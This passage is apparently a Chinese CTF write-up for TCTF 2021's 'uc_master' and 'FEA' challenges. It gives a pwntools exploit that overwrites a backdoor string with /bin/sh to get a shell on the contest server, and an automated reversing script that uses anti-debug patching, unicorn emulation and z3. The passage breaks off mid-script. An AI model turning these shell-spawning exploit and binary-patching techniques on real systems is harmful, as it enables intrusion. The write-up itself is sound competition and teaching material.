n)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span>(<span class="hljs-params">uc</span>):</span><br>    <span class="hljs-keyword">global</span> writable<br><br>    uc.safe_mem_write = types.MethodType(_safe_mem_write, uc)<br><br>    uc.mem_map(CODE, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_EXEC)<br>    uc.mem_write(CODE, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x1000</span>)<br>    uc.mem_map(CODE + <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x1000</span>, UC_PROT_ALL)<br>    uc.mem_write(CODE + <span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x1000</span>)<br>    uc.mem_map(CODE + <span class="hljs-number">0x2000</span>, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_EXEC)<br>    uc.mem_write(CODE + <span class="hljs-number">0x2000</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x1000</span>)<br>    uc.mem_write(CODE, MAIN)<br>    uc.mem_write(CODE + <span class="hljs-number">0x2000</span>, TAIL)<br><br>    uc.mem_map(STACK, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_WRITE)<br>    uc.reg_write(UC_X86_REG_RSP, STACK + <span class="hljs-number">0xf00</span>)<br>    uc.mem_write(STACK, p64(CODE + <span class="hljs-number">0x1000</span>) + p64(CODE + <span class="hljs-number">0x2000</span>) + p64(CODE))<br><br>    writable = (CODE + <span class="hljs-number">0x1000</span>, STACK)<br><br>    uc.hook_add(UC_HOOK_INSN, hook_syscall, <span class="hljs-literal">None</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, UC_X86_INS_SYSCALL)<br>    uc.hook_add(UC_HOOK_CODE, admin_hook, <span class="hljs-literal">None</span>, admin_offset, admin_offset + <span class="hljs-number">1</span>)<br>    uc.hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">play</span>():</span><br>    uc = Uc(UC_ARCH_X86, UC_MODE_64)<br>    init(uc)<br><br>    data = os.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">0xd</span>)<br>    data += <span class="hljs-string">b&#x27;\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08&#x27;</span><br>    uc.mem_write(CODE + <span class="hljs-number">0x1000</span>, data)<br><br>    <span class="hljs-keyword">try</span>:<br>        uc.emu_start(CODE, CODE + <span class="hljs-number">0x3000</span> - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&quot;error...&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    play()<br><br><br></code></pre></td></tr></table></figure><p>题目菜单</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">Welcome to uc_masteeer<br><span class="hljs-number">1.</span> admin test<br><span class="hljs-number">2.</span> user test<br><span class="hljs-number">3.</span> patch data<br>?:<br></code></pre></td></tr></table></figure><p>sys_call<br>rdi =&gt; 调用号<br>rsi =&gt; 参数1<br>rdx =&gt; 参数2<br>rcx =&gt; 参数3</p><p>系统调用表<br>0: read(fd, buf_addr, size)<br>1: write(fd, buf_addr, size)<br>60: exit(code)</p><p>admin: jmp [0xBABECAFE008] -&gt; tail<br>main:  jmp [0xBABECAFE000] -&gt; admin<br>tail:  jmp [0xBABECAFE010] -&gt; main</p><p>main 中触发 admin 代码加载并设置 is_admin = true, 然后 jmp [0xBABECAFE000] 跳转到 admin 代码执行，admin 代码中有后门字符串，修改字符串 echo 位置为 /bin/sh.</p><p>main 触发 admin 加载后，admin 会立即执行，没有机会修改 admin 代码。</p><p>利用思路: 修改 [0xBABECAFE000] 内存为 main 地址，防止执行 admin, 进一步修改 admin 内存中的字符串为 /bin/sh ， 最后[0xBABECAFE000]修改回admin的地址，通过 user test 执行 admin.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>CODE = <span class="hljs-number">0xdeadbeef000</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process([&#x27;python3&#x27;, &#x27;sb2.py&#x27;])</span><br>p=remote(<span class="hljs-string">&#x27;111.186.59.29&#x27;</span>, <span class="hljs-number">10087</span>)<br>p.sendline(<span class="hljs-string">&quot;&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(<span class="hljs-number">0xBABECAFE000</span>))<br>p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(<span class="hljs-number">0x8</span>))<br>p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, p64(<span class="hljs-number">0xdeadbeef000</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(<span class="hljs-number">0xDEADBEF005A</span>))<br>p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(<span class="hljs-number">0x8</span>))<br>p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(<span class="hljs-number">0xBABECAFE000</span>))<br>p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(<span class="hljs-number">0x8</span>))<br>p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, p64(<span class="hljs-number">0xdeadbef0000</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="FEA"><a href="#FEA" class="headerlink" title="FEA"></a>FEA</h2><p>给出一个连上端口后下载的文件： <a href="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/FEA" title="FEA">FEA</a></p><p>要求选手自动化逆向<br>连上端口，通过 proof 验证后，服务端发回一个 ELF 文件，需要在 10s 内提交该 ELF 解出来的 flag，一共要解3次。</p><p>简单分析服务器发回的 ELF 文件, 用 ollvm 混淆过，有两次反调试调用.<br>反调试函数地址: 0x400EC0 直接 patch </p><p>SMC 解密</p><img src="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/16254610407351.jpg" class="" width="16254610407351"><p>调用SMC解密出来的代码</p><img src="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/16254611212081.jpg" class="" width="16254611212081"><p>解密出来的代码逻辑：<br>从标准输入读取 8 字节数据做加密变换，再调用一个非常大的函数生成比较数据，最后比较加密后的数据是否与 8 字节的比较数据一致。</p><p>加密变换过程如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuckyou</span>(<span class="hljs-params">a1, a2, a3, a4</span>):</span><br>    v2 = <span class="hljs-number">7</span> * a2<br>    print(<span class="hljs-string">&quot;v2 = &quot;</span>, <span class="hljs-built_in">hex</span>(v2))<br>    <span class="hljs-keyword">if</span> v2:<br>        v3 = (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">else</span>:<br>        v3 = <span class="hljs-number">0xfffffffa</span><br><br>    print(<span class="hljs-string">&quot;v3 = &quot;</span>, <span class="hljs-built_in">hex</span>(v3))<br><br>    v4 = a1 + <span class="hljs-number">6</span><br>    print(<span class="hljs-string">&quot;v4 = &quot;</span>, <span class="hljs-built_in">hex</span>(v4))<br><br>    v5 = a4 + <span class="hljs-number">5</span><br>    print(<span class="hljs-string">&quot;v5 = &quot;</span>, <span class="hljs-built_in">hex</span>(v5))<br>    v6 = a3 * <span class="hljs-number">4</span><br>    print(<span class="hljs-string">&quot;v6 = &quot;</span>, <span class="hljs-built_in">hex</span>(v6))<br><br>    <span class="hljs-keyword">if</span> v6:<br>        v1 = (v6 &amp; <span class="hljs-number">0xffff</span>) - (v6 &gt;&gt; <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">else</span>:<br>        v1 = <span class="hljs-number">0xFFFFFFFD</span><br><br>    print(<span class="hljs-string">&quot;v1 = &quot;</span>, <span class="hljs-built_in">hex</span>(v1))<br><br><br>    v7 = ((v3 ^ v5) &amp; <span class="hljs-number">0xffff</span>) * <span class="hljs-number">3</span><br><br>    print(<span class="hljs-string">&quot;v7 = &quot;</span>, <span class="hljs-built_in">hex</span>(v7))<br><br>    hight_v7 = v7 &gt;&gt; <span class="hljs-number">16</span><br>    low_v7 = v7 &amp; <span class="hljs-number">0xffff</span><br>    tmp = low_v7 - hight_v7<br>    v8 = tmp<br>    print(<span class="hljs-string">&quot;v8 = &quot;</span>, <span class="hljs-built_in">hex</span>(v8))<br><br>    v9_t = (v8 + (v1 ^ v4))<br><br>    v9 = v9_t &amp; <span class="hljs-number">0xffff</span><br><br>    print(<span class="hljs-string">&quot;v9 = &quot;</span>, <span class="hljs-built_in">hex</span>(v9))<br>    v9_2 = v9 * <span class="hljs-number">2</span><br><br><br>    print(<span class="hljs-string">&quot;v9 * 2 = &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-number">2</span> * v9))<br><br>    v10 = (v9_2 &amp; <span class="hljs-number">0xffff</span>) - (v9_2 &gt;&gt; <span class="hljs-number">16</span>)<br>    print(<span class="hljs-string">&quot;v10 = &quot;</span>, <span class="hljs-built_in">hex</span>(v10))<br><br><br>    r1 = (((v3 ^ v10) &lt;&lt; <span class="hljs-number">16</span> ) | (v10 ^ v5)) &amp; <span class="hljs-number">0xffffffff</span><br>    r2 = (((v4 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 ^ (v10 + v8) ) &amp; <span class="hljs-number">0xffff</span>)<br><br>    print(<span class="hljs-string">&quot;r1 = &quot;</span>, <span class="hljs-built_in">hex</span>(r1))<br>    print(<span class="hljs-string">&quot;r2 = &quot;</span>, <span class="hljs-built_in">hex</span>(r2))<br><br>    <span class="hljs-keyword">return</span> r1, r2<br></code></pre></td></tr></table></figure><p>用 z3 写出逆函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuckyouZ3</span>(<span class="hljs-params">targetR1, targetR2</span>):</span><br>    a1 = BitVec(<span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">32</span>)<br>    a2 = BitVec(<span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">32</span>)<br>    a3 = BitVec(<span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">32</span>)<br>    a4 = BitVec(<span class="hljs-string">&quot;a4&quot;</span>, <span class="hljs-number">32</span>)<br><br>    v2 = <span class="hljs-number">7</span> * a2<br><br>    v3 = If(v2 != <span class="hljs-number">0</span>, (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xfffffffa</span>)<br>    v4 = a1 + <span class="hljs-number">6</span><br>    v5 = a4 + <span class="hljs-number">5</span><br>    v6 = a3 * <span class="hljs-number">4</span><br><br>    v1 = If(v6 != <span class="hljs-number">0</span>, (v6 &amp; <span class="hljs-number">0xffff</span>) - (v6 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xFFFFFFFD</span>)<br>    v7 = ((v3 ^ v5) &amp; <span class="hljs-number">0xffff</span>) * <span class="hljs-number">3</span><br><br>    hight_v7 = v7 &gt;&gt; <span class="hljs-number">16</span><br>    low_v7 = v7 &amp; <span class="hljs-number">0xffff</span><br>    tmp = low_v7 - hight_v7<br>    v8 = tmp<br>    v9_t = (v8 + (v1 ^ v4))<br>    v9 = v9_t &amp; <span class="hljs-number">0xffff</span><br>    v9_2 = v9 * <span class="hljs-number">2</span><br><br>    v10 = (v9_2 &amp; <span class="hljs-number">0xffff</span>) - (v9_2 &gt;&gt; <span class="hljs-number">16</span>)<br><br>    r1 = (((v3 ^ v10) &lt;&lt; <span class="hljs-number">16</span>) | (v10 ^ v5)) &amp; <span class="hljs-number">0xffffffff</span><br>    r2 = (((v4 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>)<br><br>    s = Solver()<br>    s.add(a1 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a2 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a3 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a4 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(<span class="hljs-number">0</span> &lt;= a1)<br>    s.add(<span class="hljs-number">0</span> &lt;= a2)<br>    s.add(<span class="hljs-number">0</span> &lt;= a3)<br>    s.add(<span class="hljs-number">0</span> &lt;= a4)<br>    s.add(r1 == targetR1)<br>    s.add(r2 == targetR2)<br>    <span class="hljs-keyword">assert</span> s.check() == sat<br>    res = s.model()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([de(res[a1].as_long()), de(res[a2].as_long()), de(res[a3].as_long()), de(res[a4].as_long())])<br></code></pre></td></tr></table></figure><p>提取出生成的比较数据，调用 fuckyouZ3 就可以得到输入.</p><p>这道要求自动化逆向，服务器发回的 ELF 文件，比较数据计算函数代码都不一样。<br>为了得到比较数据，我们需要自动化：</p><ol><li>自动化解密 SMC</li><li>自动化调用比较数据计算函数</li></ol><p>自然想到用 unicorn 模拟执行。经过尝试，unicorn 解密 SMC 很慢，调用比较数据计算函数的速度可以接受。</p><p>尝试自动化 patch ELF 文件实现自动化SMC解密。<br>patch点：在 SMC 解密完成后调用 write 输出解密后的数据。</p><img src="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/16254620550325.jpg" class="" width="16254620550325"><p>运行 patch 之后的程序，从标准输出可以得到解密后的 SMC 代码数据。</p><p>得到 SMC 代码数据后，直接用 unicorn 调用 SMC 代码中生成比较数据的函数，即可得到比较数据。<br>生成比较数据的函数中存在一些 int3 指令，主程序提前设置了处理 int3 的 handler，handler 中对关键数据进行变换，unicorn 中需要处理这种情况。</p><p>完整 exp 实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_code</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">pass</span><br>        <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_int3</span>(<span class="hljs-params">uc, intro, user_data</span>):</span><br>    rip = uc.reg_read(UC_X86_REG_RIP)<br>    deadVal = u32(uc.mem_read(<span class="hljs-number">0xDEAD0000</span>, <span class="hljs-number">4</span>))<br>    deadVal ^= <span class="hljs-number">0xDEADBEEF</span><br>    uc.mem_write(<span class="hljs-number">0xDEAD0000</span>, p32(deadVal))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuck</span>(<span class="hljs-params">code</span>):</span> <span class="hljs-comment"># 调用 unicorn 从 smc code 中提取比较数据</span><br>    CODE = <span class="hljs-number">0x0</span><br>    CODE_SIZE = <span class="hljs-number">0x100000</span><br><br>    DATA = <span class="hljs-number">0x700000</span><br>    DATA_SIZE = <span class="hljs-number">0x20000</span><br><br>    STACK = <span class="hljs-number">0x7F00000000</span><br>    STACK_SIZE = <span class="hljs-number">0x10000</span><br><br>    DEAD = <span class="hljs-number">0xDEAD0000</span><br>    DEAD_SIZE = <span class="hljs-number">0x1000</span><br><br>    uc = Uc(UC_ARCH_X86, UC_MODE_64)<br>    uc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL)<br>    uc.mem_map(DEAD, DEAD_SIZE, UC_PROT_ALL)<br>    uc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL)<br>    uc.mem_map(DATA, DATA_SIZE, UC_PROT_ALL)<br><br>    uc.mem_write(CODE, code)<br>    uc.reg_write(UC_X86_REG_RSP, STACK + STACK_SIZE - <span class="hljs-number">0x10</span>)<br><br>    uc.hook_add(UC_HOOK_CODE, hook_code)<br>    uc.hook_add(UC_HOOK_INTR, hook_int3)<br>    uc.reg_write(UC_X86_REG_RDI, DATA)<br><br>    uc.mem_write(STACK + STACK_SIZE - <span class="hljs-number">0x10</span>, p64(<span class="hljs-number">0x1447380</span>))<br><br>    <span class="hljs-keyword">try</span>:<br>        uc.emu_start(<span class="hljs-number">0</span>, <span class="hljs-number">0x1447380</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        data = uc.mem_read(DATA, <span class="hljs-number">0x8</span>)<br>        <span class="hljs-keyword">return</span> u32(data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]), u32(data[<span class="hljs-number">4</span>:])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">de</span>(<span class="hljs-params">x</span>):</span><br>    x = <span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:]<br>    rr = x[<span class="hljs-number">2</span>:] + x[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>    print(rr)<br>    <span class="hljs-keyword">return</span> rr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuckyouZ3</span>(<span class="hljs-params">targetR1, targetR2</span>):</span> <span class="hljs-comment"># 从比较数据计算输入flag</span><br>    a1 = BitVec(<span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">32</span>)<br>    a2 = BitVec(<span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">32</span>)<br>    a3 = BitVec(<span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">32</span>)<br>    a4 = BitVec(<span class="hljs-string">&quot;a4&quot;</span>, <span class="hljs-number">32</span>)<br><br>    v2 = <span class="hljs-number">7</span> * a2<br><br>    v3 = If(v2 != <span class="hljs-number">0</span>, (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xfffffffa</span>)<br>    v4 = a1 + <span class="hljs-number">6</span><br>    v5 = a4 + <span class="hljs-number">5</span><br>    v6 = a3 * <span class="hljs-number">4</span><br><br>    v1 = If(v6 != <span class="hljs-number">0</span>, (v6 &amp; <span class="hljs-number">0xffff</span>) - (v6 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xFFFFFFFD</span>)<br>    v7 = ((v3 ^ v5) &amp; <span class="hljs-number">0xffff</span>) * <span class="hljs-number">3</span><br><br>    hight_v7 = v7 &gt;&gt; <span class="hljs-number">16</span><br>    low_v7 = v7 &amp; <span class="hljs-number">0xffff</span><br>    tmp = low_v7 - hight_v7<br>    v8 = tmp<br>    v9_t = (v8 + (v1 ^ v4))<br>    v9 = v9_t &amp; <span class="hljs-number">0xffff</span><br>    v9_2 = v9 * <span class="hljs-number">2</span><br><br>    v10 = (v9_2 &amp; <span class="hljs-number">0xffff</span>) - (v9_2 &gt;&gt; <span class="hljs-number">16</span>)<br><br>    r1 = (((v3 ^ v10) &lt;&lt; <span class="hljs-number">16</span>) | (v10 ^ v5)) &amp; <span class="hljs-number">0xffffffff</span><br>    r2 = (((v4 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>)<br><br>    s = Solver()<br>    s.add(a1 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a2 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a3 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a4 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(<span class="hljs-number">0</span> &lt;= a1)<br>    s.add(<span class="hljs-number">0</span> &lt;= a2)<br>    s.add(<span class="hljs-number">0</span> &lt;= a3)<br>    s.add(<span class="hljs-number">0</span> &lt;= a4)<br>    s.add(r1 == targetR1)<br>    s.add(r2 == targetR2)<br>    <span class="hljs-keyword">assert</span> s.check() == sat<br>    res = s.model()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([de(res[a1].as_long()), de(res[a2].as_long()), de(res[a3].as_long()), de(res[a4].as_long())])<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256,sha3_256<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">code</span>):</span><br>    CODE_DATA = code<br>    <span class="hljs-comment"># 自动 patch</span><br>    insCode = [<span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x00</span>]<br>    CODE_DATA = <span class="hljs-built_in">bytearray</span>(CODE_DATA)<br>    CODE_DATA[<span class="hljs-number">0x132E</span>:<span class="hljs-number">0x132E</span>+<span class="hljs-built_in">len</span>(insCode)] = insCode<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;file_2&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(CODE_DATA)<br>    os.system(<span 